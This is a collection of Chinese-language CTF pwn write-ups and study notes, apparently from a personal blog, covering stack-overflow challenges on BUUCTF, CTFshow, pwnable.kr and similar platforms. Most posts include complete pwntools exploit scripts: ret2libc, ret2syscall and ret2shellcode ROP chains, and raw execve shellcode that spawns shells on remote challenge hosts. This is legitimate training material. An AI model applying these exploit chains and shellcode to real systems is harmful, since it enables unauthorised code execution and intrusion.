{"posts":[{"title":"[BUUCTF]ciscn_2019_c_1","content":"64位，开启了NX： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 主要功能是对输入的字符串进行了加密，没有提供解密功能。 加密部分的函数encrypt()主要内容如下： int encrypt() { size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(&quot;Input your Plaintext to be encrypted&quot;); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 &gt;= strlen(s) ) break; if ( s[x] &lt;= 96 || s[x] &gt; 122 ) { if ( s[x] &lt;= 64 || s[x] &gt; 90 ) { if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 ) s[x] ^= 0xFu; } else { s[x] ^= 0xEu; } } else { s[x] ^= 0xDu; } ++x; } puts(&quot;Ciphertext&quot;); return puts(s); } 这里会把输入的内容和v0的值进行比较，涉及到一个知识点：strlen()遇到\\x00就会停止。所以我们输入的字符串开头就为\\x00的话，就会跳到break;这里，不用进行异或比对了。 可以看到gets()存在栈溢出漏洞，可以利用它泄露出puts()的got地址。首先因为是64位的，传参传到了rdi中，要找到可以利用的地址： ROPgadget --binary ciscn_2019_c_1 --only &quot;pop|ret&quot;|grep &quot;rdi&quot; 得到： 0x0000000000400c83 : pop rdi ; ret 偏移量为0x50，因为前面有\\x00所以减去1（'\\x00'+'a'*(0x50-1)）。 所以payload1为： payload1 = '\\x00'+'a'*(0x50-1)+p64(deadbeef)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) 成功接收到puts()的实际地址： from pwn import * elf = ELF('./ciscn_2019_c_1') local = 1 if local == 1: io = process('./ciscn_2019_c_1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: io = remote('node4.buuoj.cn',25182) rdi_addr = 0x400c83 puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] main_addr = 0x400B28 payload1 = '\\x00'+'a'*(0x50-1)+p64(0xdeadbeef)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) io.recvuntil(&quot;choice!\\n&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;encrypted\\n&quot;) io.sendline(payload1) io.recvuntil(&quot;Ciphertext\\n\\n&quot;) print(io.recvline()) 对puts的实际地址进行解包操作，因为位数不够后面加上'\\x00\\x00'。接下来利用puts()的实际地址的十六进制形式，去libc.blukat.me进行查询，得到服务器使用的libc为libc6_2.27-3ubuntu1_amd64.so。最后要考虑堆栈平衡，添加ret。完整的exp如下： from pwn import * elf = ELF('./ciscn_2019_c_1') local = 0 if local == 1: io = process('./ciscn_2019_c_1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: io = remote('node4.buuoj.cn',27698) libc = ELF('./libc6_2.27-3ubuntu1_amd64.so') rdi_addr = 0x400c83 puts_plt = elf.symbols['puts'] puts_got = elf.got['puts'] main_addr = 0x400B28 payload1 = '\\x00'+'a'*(0x50-1)+p64(0xdeadbeef)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) io.recvuntil(&quot;choice!\\n&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;encrypted\\n&quot;) io.sendline(payload1) io.recvuntil(&quot;Ciphertext\\n\\n&quot;) puts_addr = u64(io.recvline()[0:6]+'\\x00\\x00') print(hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] system_addr = libc_base + libc.symbols['system'] binsh_addr = libc_base + libc.search('/bin/sh').next() ret = 0x00000000004006b9 payload2 = '\\x00'+'a'*(0x50-1)+p64(0xdeadbeef)+p64(ret)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr) io.recvuntil(&quot;choice!\\n&quot;) io.sendline(&quot;1&quot;) io.recvuntil(&quot;encrypted\\n&quot;) io.sendline(payload2) io.recvuntil(&quot;Ciphertext\\n\\n&quot;) io.interactive() ","link":"https://shawr00t.github.io/buuctfciscn_2019_c_1/"},{"title":"[PWN]ret2syscall 学习笔记","content":"ret2syscall 即控制程序执行系统调用来获取 shell。 rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 gadgets：在程序中的指令片段，有时为了达到执行命令的目的，需要多个gadget来完成功能。gadget最后一般都有ret，因为需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。 ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：从pop、ret序列当中寻找其中的eax：ROPgadget --binary ./example --only “pop|ret” | grep “eax” 在linux系统中，函数的调用是有一个系统调用号的。Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。简单来讲，通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了。： 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 系统调用号系统调用号有32位与64位的区分，Ubuntu环境下系统调用号的位置：/usr/include/x86_64-linux-gnu/asm。 unistd_32.h unistd_64.h execve(“/bin/sh”,null,null)函数其32位系统调用号是11，即十六进制0xb。 系统调用号，即 eax 应该为 0xb。 第一个参数，即 ebx 应该指向 /bin/sh 的地址（其实执行 sh 的地址也可以）。 第二个参数，即 ecx 应该为 0。 第三个参数，即 edx 应该为 0。 系统在运行的时候会使用上面四个寄存器，所以那么上面内容可以写为：int 0×80(eax,ebx,ecx,edx)。 只需要让栈顶的值是0xb，然后通过pop eax达到目的（把栈顶的值返回到寄存器eax中）。 例题：戳我 checksec: Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) main函数很明显的栈溢出： int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;); puts(&quot;What do you plan to do?&quot;); gets(&amp;v4); return 0; } 使用cyclic工具可计算得到偏移量为112： 使用ROPgadget工具找到pop eax： ROPgadget --binary ./Desktop/rop --only &quot;pop|ret&quot; |grep &quot;eax&quot; 得到可利用的地址为0x080bb196： 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 继续找pop ebx，得到可用的地址为0x0806eb90： 0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913 : pop ebx ; pop esi ; pop edi ; ret 0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9 : pop ebx ; ret 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b : pop edi ; pop esi ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret 0x0805c820 : pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret 再找一下&quot;/bin/sh&quot;字符串的位置： ROPgadget --binary ./Desktop/rop --string &quot;/bin/sh&quot; Strings information ============================================================ 0x080be408 : /bin/sh 再找一下&quot;int 80&quot;的位置： ROPgadget --binary ./Desktop/rop --only &quot;int&quot; Gadgets information ============================================================ 0x08049421 : int 0x80 from pwn import * io = process('./rop') pop_eax_ret = 0x080bb196 pop_other_ret = 0x0806eb90 binsh = 0x080be408 int80h = 0x08049421 payload = 'a'*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(binsh)+p32(int80h) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/pwnret2syscall-xue-xi-bi-ji/"},{"title":"[BUUCTF]ciscn_2019_n_1 ","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) main函数内容如下： int func() { int result; // eax char v1; // [rsp+0h] [rbp-30h] float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(&quot;Let's guess the number.&quot;); gets((__int64)&amp;v1); if ( v2 == 11.28125 ) result = system(&quot;cat /flag&quot;); else result = puts(&quot;Its value should be 11.28125&quot;); return result; } 是考察溢出又不是普通的考察溢出^^。 因为rbp-30h是存储v1的地址，rbp-4h是存储 v2的地址。 所以在(30h-4h）见填充'a'，在开始存储v2的地址处填入11.28125的十六进制数即可，十六进制的值在IDA里可以看见。 from pwn import * io = remote('node4.buuoj.cn','27329') payload = 'a'*(0x30-0x4)+p64(0x41348000) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/buuctfciscn_2019_n_1/"},{"title":"[XMAN]pwn level1   ","content":"checksec： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments main函数调用了vulnerable_function()，其内容如下： ssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] printf(&quot;What's this:%p?\\n&quot;, &amp;buf); return read(0, &amp;buf, 0x100u); } 因为关闭了NX保护，且打印了buf的地址，可以把shellcode写入已知地址的buf变量中，然后计算偏移量，最后利用溢出把地址返回到buf执行shellcode。 from pwn import * io = remote('pwn2.jarvisoj.com','9877') shell= asm(shellcraft.i386.linux.sh()) buf_addr = int(io.recvline()[12:-2],16) shell_addr = shell+'a'*(0x88+0x4-len(shell))+p32(buf_addr) io.sendline(shell_addr) io.interactive() ","link":"https://shawr00t.github.io/xmanpwn-level1/"},{"title":"[PWN]ret2libc学习笔记","content":"参考天正师傅的博客学习了下^^。 ret2libc这种攻击方式主要是针对动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。 Q：什么是动态链接？ 动态链接是指在程序装载时通过动态链接器将程序所需的所有动态链接(Dynamic linking library) 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。 它诞生的最主要的的原因就是静态链接太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在静态链接的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过动态链接的方式就推迟这个链接过程到了程序运行时进行。 动态链接的程序在运行时会根据自己所依赖的动态链接库，通过动态链接器将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux系统中，ELF动态链接文件被称为动态共享对象（Dynamic Shared Objects），简称共享对象。一般都是以 “.so” 为扩展名的文件，在pwn中我们常称之为libc库；在windows系统中就是常常软件报错缺少xxx.dll文件。 Q：什么是GOT表和PLT表？ GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。 PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。 打个比方，我发布文章把别人的段落复制到我的文章里就是静态链接，做一个超链接需要点击就属于动态链接。PLT是超链接本身，GOT是超链接中的内容。 Q：延迟绑定的基本原理？ 假如存在一个puts函数，这个函数在PLT中的条目为puts@plt，在GOT中的条目为puts@got，那么在第一次调用puts函数的时候，首先会跳转到PLT表，伪代码如下： puts@plt: jmp puts@got patch puts@got 这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch puts@got，这一行代码的作用是将puts函数真正的地址填充到puts@got，然后跳转到puts函数真正的地址执行代码。当我们下次再调用puts函数的时候，执行路径就是先后跳转到puts@plt、puts@got、puts真正的地址。 也就是说，PLT表和GOT表是一一对应的，GOT表中存的是函数的实际地址，而PLT表中存的是函数GOT表的地址。另外，PLT、GOT之类的地址是固定的。 延时绑定是只有动态库函数在被调用时，才会地址解析和重定位工作。ret2libc需要构造两次payload。 Ret2libc题目的特点如下： 在做题的时候，会给两个文件。一个是elf程序文件，另一个则是libc库文件。不过有的题目也不会给出libc库，需要我们根据函数在libc库中的偏移量来查找对应的libc库。 程序中不会有system()或者bin字符串。 NX一般也是关闭的，没有RWX（读取、写入、执行）的位置。 考虑动态链接的情况，libc库中有system()和binsh字符串。 由于ASLR（地址随机化），每次运行libc的位置都会有变动（一般题目默认开启ALSR）。 函数地址、字符串地址、gadgets（程序中存在的程序小片段）地址不知道。 由于按页分配，libc地址一定是000结尾。ldd+程序查看libc地址。 不同版本的libc中，函数的偏移基本不同。虽然libc的位置在变动，但是装载时是一个整体，内部的偏移不变。例如，system()距libc起始地址不变（已知）、read函数距离libc起始地址不变（已知），system()和read()之间的距离不变。如果read()的真实地址已知，就可以计算出system()的真实地址。 Q：确定libc的两种方法？ 方法一：在线寻找libc。（在线查询：https://libc.nullbyte.cat/） 不同版本的libc中函数的偏移基本不同。gbd调试，run程序后，ctrl+c中断程序，使用p（print）查看函数地址，再次run，对比system和read函数的地址。 通过低3位可判断使用的libc版本，并得到其他函数的偏移。 点击匹配的版本，可以看到指定函数和其他函数的位置偏移，减掉“Difference”的地址差就可以得到想要的函数的地址： 方法二：使用LibcSearcher（线下无网络时常用） git clone https://hub.fastgit.org/lieanu/LibcSearcher.git cd LibSearcher sudo python setup.py develop 简单的使用示例 from LibcSearcher import * #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型 obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90) libcbase = 0X7ff39014bd90 - obj.dump(&quot;puts&quot;) #基址 obj.dump(&quot;system&quot;) #system 偏移 obj.dump(&quot;str_bin_sh&quot;) #/bin/sh 偏移 system_addr = libcbase + obj.dump(&quot;system&quot;) #system实际地址 bin_sh_addr = libcbase+obj.dump(&quot;str_bin_sh&quot;) #/bin/sh实际地址 使用时出现报错：解决方法 ","link":"https://shawr00t.github.io/ctfshowpwn03/"},{"title":"[CTFshow]01栈溢出之ret2text","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdin, 0LL, 1, 0LL); setvbuf(stdout, 0LL, 2, 0LL); welcome(); return 0; } 可以看到主程序会回显输入的内容，然后调用welcome()。 welcome()内容如下： int welcome() { char s; // [rsp+0h] [rbp-80h] gets(&amp;s); return puts(&amp;s); } 存在后门ctfshow()。地址为0x400637 溢出点在welcome()里。编写exp即可，不想说太多： from pwn import * io = process('./pwn') payload = 'a'*0x80+'a'*0x8+p64(0x400637) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/ctfshow01-zhan-yi-chu-zhi-ret2text/"},{"title":"[CTFshow]pwn02","content":"查看checksec： Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 使用IDA查看其main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(&quot;stack happy!&quot;); puts(&quot;32bits\\n&quot;); pwnme(); puts(&quot;\\nExiting&quot;); return 0; } pwnme()内容如下： int pwnme() { char s; // [esp+Fh] [ebp-9h] fgets(&amp;s, 50, stdin); return 0; } 可以看到其ebp为0x9，返回地址为0x4，而且该程序存在后门函数： int stack() { return system(&quot;/bin/sh&quot;); } 编写exp利用即可： from pwn import * io = remote('pwn.challenge.ctf.show','28155') payload = 'a'*0x9+'a'*0x4+p64(0x804850f) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/ctfshowpwn02/"},{"title":"[CTFhub]ret2shellcode","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf; // [rsp+0h] [rbp-10h] __int64 v5; // [rsp+8h] [rbp-8h] buf = 0LL; v5 = 0LL; setvbuf(_bss_start, 0LL, 1, 0LL); puts(&quot;Welcome to CTFHub ret2shellcode!&quot;); printf(&quot;What is it : [%p] ?\\n&quot;, &amp;buf, 0LL, 0LL); puts(&quot;Input someting : &quot;); read(0, &amp;buf, 0x400uLL); return 0; } 没有预留的后门，没有开启NX保护。这道题可以写在栈上。用gdb调试，发现栈区可以写入。 buf的地址在程序运行的时候会回显。buf变量总共为24字节。 这次我使用了长度为23字节的shell： shell=&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; 但是因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode。所以要把shellcode放到返回地址之后。 from pwn import * io = process('./pwn') io.recvuntil('[') # buf与rbp的距离16 + rbp的宽度8 + 返回地址的长度8 address = int(io.recvuntil(']')[:-1],16)+0x10+0x8+0x8 shell=&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; payload = 'a'*0x10+'a'*0x8+p64(address)+shell io.sendlineafter('someting : ',payload) io.interactive() ","link":"https://shawr00t.github.io/ctfhubret2shellcode/"},{"title":"[PWN]ret2shellcode学习笔记","content":"跟着天正师傅博客学的： 例题附件下载 checksec，这次是32位的： [*] '/home/shawroot/Desktop/ret2sc' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-14h] setvbuf(stdout, 0, 2, 0); printf(&quot;Name:&quot;); read(0, &amp;name, 0x32u); printf(&quot;Try your best:&quot;); return (int)gets(&amp;s); } 有两处输入的地方，分别用了read()和gets()函数去实现。name变量长度足够，不存在栈溢出，gets()函数未限制输入的长度，存在栈溢出。 但是这道题没有back♂door了，不能用之前学的ret2text去利用，必须自己再写一个shellcode进去。 写接下来的内容之前，需要了解bss段： bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，bss段属于静态内存分配。 可以使用readelf命令查看bss段的地址： readelf -S filename 能看到bss的地址为0x0804a040。 接下来将程序导入gdb并运行，ctrl+c将程序中断，利用vmmap查看地址段权限，必须保证bss段有可执行权限，shellcode才能运行。 $ gdb ret2sc gdb-peda$ r # ctrl + c gdb-peda$ vmmap bss段地址0x0804a040在范围0x0804a000到0x0804b000之间，它是可读可写的，name变量也在bss段中，地址为0x0804A060可以把shellcode写进name变量里，让gets()函数的那里的返回地址溢出到name变量所在的地方。 找寻溢出偏移。首先打开另一个终端，输入gdb后，使用pattern create 100命令生成一个100长度的字符串。 再使用gdb调试题目，按下r键。因为name处不存在溢出，在“Try your best:”下面把这串字符串粘进去，得到程序被中断的警告，程序的返回地址（0x41412941）被输入的字符串覆盖了。再使用pattern offset 0x41412941命令计算偏移量，得到32。 至此，可以编写exp了： from pwn import * io = process('./ret2sc') shellcode = asm(shellcraft.sh()) name_addr = 0x0804A060 payload = 'a'*32+p32(name_addr) io.sendlineafter('Name:',shellcode) io.sendlineafter('best:',payload) io.interactive() ","link":"https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/"},{"title":"[Pwntools]学习笔记","content":"0x00 链接 连接远程服务器： r = remote('[ip]','[port]') 需要在本地进行测试： r = process('./filename') r = process(&quot;./demo&quot;,env = {'LD_PROLOAD':'./libc.so.6'}) #指定环境变量以运行文件 0x01 设置运行时的参数 通过设置目标架构和操作系统，来告诉Pwntools程序的运行环境。 context.arch = 'i386' #32位程序设置为'i386'，64位程序设置为'amd64'。 context.os = 'linux' context.log_level = 'debug' #可在屏幕上打印debug信息。 context.endian = 'big' #设置字节序为大端序，小端序设置为little。 比较推荐的是使用context.binary自动设置所有适当的值。 from pwn import * context.binary = './filename' 0x02 接收远端回传的数据 r.interactive() #在取得shell之后使用,直接进行交互，相当于回到shell的模式。 r.recv(numb=字节大小, timeout=default) #接收数据。 r.recvline(keepends=True) #接收一行，keepends为是否保留行尾的\\n。 r.recvall() #接收数据，直到达到EOF。 r.recvrepeat(timeout=default) #持续接受直到EOF或timeout。 0x03 向远端发送数据 r.send() #发送数据。 r.sendline() #发送一行数据。 r.sendafter('str',payload) #当接收到指定字符串时，发送payload。 r.sendlineafter('str',payload) #当接收到指定字符串时，发送payload和换行符。 0x04 获取函数地址 在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。 puts_addr = elf.address #获取文件装载的基地址。 puts_got_addr = elf.got['puts'] #获取puts函数got表地址。 puts_plt_addr = elf.plt['puts'] #获取puts函数plt表地址。 puts_sym_addr = elf.symbols['puts'] #获取puts函数符号表地址。 0x05 shellcraft Pwntools已经为你准备好的shellcode。 print shellcraft.i386.linux.sh() #32位。 print shellcraft.amd64.linux.sh() #64位。 Pwntools 提供的 shellcraft 库中的 shellcode 是被asm()函数进行汇编的。 from pwn import * shellcode = asm(shellcraft.amd64.linux.sh()) 0x06 整数的打包解包 p32() #将数据打包成32位二进制格式，字节序由context.endian设置。 p64() #将数据打包成64位二进制格式，字节序由context.endian设置。 u32() #将32位二进制格式数据解包。 u64() #将64位二进制格式数据解包。 0x07 设置context context.log_level：设置log级别。例如，当log_level位debug时会输出所有的交互数据。 context.arch：设置程序架构。设置完毕后，会自动全局设置，生成shellcode时shellcraft、asm不用指定架构。 context.terminal：设置新起命令的格式。 context.endian：设置大小端。 ","link":"https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/"},{"title":"[BUUCTF]rip","content":"checksec： Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments main函数： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+1h] [rbp-Fh] puts(&quot;please input&quot;); gets(&amp;s, argv); puts(&amp;s); puts(&quot;ok,bye!!!&quot;); return 0; } s的rbp为0xf，返回地址为0x8，然后看下back♂door函数： int fun() { return system(&quot;/bin/sh&quot;); } 栈溢出，back♂door的地址为0x401197，exp我写成如下的形式： from pwn import * io = remote('node3.buuoj.cn',27563) payload = 'a'*0xf+'a'*0x08+p64(0x401186) io.sendline(payload) io.interactive() 出乎意料的报错了，查了下资料： buuctf 最新使用的 ubuntu 18.04 要求 system 函数调用时栈指针必须 16 对齐。 需要ret到 ret 这个指令本身的地址，再ret一遍到后门，修改后的exp如下： from pwn import * io = remote('node3.buuoj.cn',27563) payload = 'a'*0xf+'a'*0x08+p64(0x401142)+p64(0x401186) io.sendline(payload) io.interactive() 也可以ret到后门函数顶上的 mov rdp rsp（把rsp这个栈指针（Stack Pointer）的值复制到rbp里，rsp始终会指向栈顶）那里： from pwn import * io = remote('node3.buuoj.cn',27563) payload = 'a'*0xf+'a'*0x08+p64(0x401187)+p64(0x401186) io.sendline(payload) io.interactive() ","link":"https://shawr00t.github.io/buuctfrip/"},{"title":"[CTFhub]ret2text","content":" ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 checksec了一下，64位没开任何保护。 main函数内容如下： int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp+0h] [rbp-70h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;Welcome to CTFHub ret2text.Input someting:&quot;); gets(&amp;v4, 0LL); puts(&quot;bye&quot;); return 0; } 找到栈大小和返回地址后，看secure函数，内容如下： int secure() { unsigned int v0; // eax int result; // eax int v2; // [rsp+8h] [rbp-8h] int v3; // [rsp+Ch] [rbp-4h] v0 = time(0LL); srand(v0); v3 = rand(); __isoc99_scanf((__int64)&amp;unk_4008C8, (__int64)&amp;v2); result = v2; if ( v3 == v2 ) result = system(&quot;/bin/sh&quot;); return result; } system(&quot;/bin/sh&quot;);的内存地址位0x4007b8，写脚本： from pwn import * p = remote('challenge-93c6eb0adcd5b58f.sandbox.ctfhub.com',35615) payload = 'a'*0x70+'a'*0x08+p64(0x4007B8) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/ctfhubret2text/"},{"title":"[pwnable.kr]collision","content":"ssh连接后，可查看代码如下： #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0; } 分析代码得知传入的参数要经过check_password()的处理，且小于20个字节，且必须等于hashcode。 分析check_password()函数： unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } 这里是将char*p强制转换成int*p。int类型在32位机里占4字节，char类型占1个字节，所以是将20个字节的字符串转化成了5组，每组4个字节。 因此，最理想的情况下是将hashcode的值五等份。其值转为10进制为568134124，无法被五整除。 所以考虑(568134124+1)/5=113626825，这样113626825*4+113626824就等于568134124了。 因为C语言是小段存储，113626825转为十六进制为0x6c5cec9，要写成&quot;C9 CE C5 06&quot;这样的格式。即\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 由于ASCII码只包含128位，计算的字符都是不可显示字符，要利用python写入： ./col `python -c 'print &quot;\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06&quot;'` ","link":"https://shawr00t.github.io/pwnablekrcollision/"},{"title":"[pwnable.kr]fd","content":"ssh连进去，没有查看flag文件的权限。 fd.c代码如下： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } 很直接的可以看到得到flag的条件是让buf等于&quot;LETMEWIN\\n&quot;。 因为read函数的第一个参数为0时是写入，所以让fd为零即可。顺便马一下，atoi()是转数字的函数，和python中的int(str)差不多。0x1234转为十进制为4660，执行时第一个参数为4660，然后输入LETMEWIN，敲回车得到flag。 ","link":"https://shawr00t.github.io/pwnablekrfd/"},{"title":"[BugKu]overflowPWN","content":"checksec看了下，四个保护都没有开。 main中代码如下： int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [rsp+0h] [rbp-30h] memset(&amp;s, 0, 0x30uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(&quot;say something?&quot;); read(0, &amp;s, 0x100uLL); puts(&quot;oh,that's so boring!&quot;); return 0; } 还看到了直接获取flag的get_shell_函数，地址是0x400751： int get_shell_() { puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;); puts(&quot;this is your flag!&quot;); return system(&quot;cat flag&quot;); } 可以利用read函数溢出让返回地址为0x400751，exp如下： from pwn import * p = remote('114.67.246.176',16081) payload = 'a'*0x30+'a'*0x8+p64(0x400751) p.sendline(payload) p.interactive() ","link":"https://shawr00t.github.io/bugkuoverflowpwn/"},{"title":"[攻防世界]PWN-level0","content":"checksec查看一下信息，发现其开启了NX保护。 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 使用IDA打开，main中只有这几行代码： int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;Hello, 